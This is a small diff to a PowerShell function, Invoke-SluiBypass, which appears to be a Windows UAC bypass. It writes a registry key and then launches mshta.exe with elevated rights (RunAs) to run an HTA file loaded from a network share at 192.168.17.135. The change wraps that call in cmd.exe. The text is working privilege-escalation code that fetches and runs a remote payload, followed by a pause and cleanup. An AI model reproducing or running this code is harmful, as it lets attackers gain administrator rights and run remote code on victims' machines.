@@ -54,7 +54,7 @@ function Invoke-SluiBypass {
 
     New-Item -Path $RegRoot -Name $Name -Value $Command -Force | Out-Null
     # Start the command
-    Start-Process 'mshta.exe "\\192.168.17.135\MyShare\Downloads\info.hta"' -Verb RunAs
+    Start-Process cmd.exe -ArgumentList 'mshta.exe "\\192.168.17.135\MyShare\Downloads\info.hta"' -Verb RunAs
     # Sleep required, otherwise script executes too fast
     Sleep 3
     # Cleanup
